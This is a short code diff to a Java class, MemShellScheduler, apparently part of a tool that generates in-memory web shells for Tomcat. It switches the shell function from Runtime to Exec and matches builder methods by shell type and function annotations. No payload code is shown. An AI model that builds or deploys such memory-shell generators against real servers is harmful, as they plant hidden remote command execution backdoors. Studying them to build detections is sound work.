@@ -24,7 +24,7 @@ public class MemShellScheduler {
         javaClassHelper.setJavaClassHelperType(JavaClassHelperType.MemShell);
         javaClassHelper.setMiddleware(Middleware.Tomcat);
         javaClassHelper.setMemShell(MemShell.Listener);
-        javaClassHelper.setMemShellFunction(MemShellFunction.Runtime);
+        javaClassHelper.setMemShellFunction(MemShellFunction.Exec);
 
         // 内存马信息
         javaClassHelper.setHEADER("xxx");
@@ -77,8 +77,8 @@ public class MemShellScheduler {
 
         /**
          * 生成 Builder
+         *  即定位到具体的执行方法
          */
-
         Method msMethod = null;
         Method loaderMethod = null;
 
@@ -87,7 +87,10 @@ public class MemShellScheduler {
             MemShell memShellAnnotation = method.getAnnotation(MemShell.class);
             if (memShellAnnotation == null) continue;
 
-            if (memShellAnnotation.value().equalsIgnoreCase(memShell)) {
+            MemShellFunction memShellFunctionAnnotation = method.getAnnotation(MemShellFunction.class);
+            if (memShellFunctionAnnotation == null) continue;
+
+            if (memShellAnnotation.value().equalsIgnoreCase(memShell) && memShellFunctionAnnotation.value().equalsIgnoreCase(memShellFunction)) {
                 msMethod = method;
                 Printer.blueInfo("MS builder Method: " + method.getName() + ", Annotation Value: " + memShellAnnotation.value());
                 break;
@@ -148,7 +151,7 @@ public class MemShellScheduler {
 
 
         /**
-         * 生成 Loader 和 MemShell
+         * 生成加载 Loader 和 MemShell
          */
         Object loaderBuilder = loaderBuilderClass.newInstance();
         Object msBuilder = msBuilderClass.newInstance();
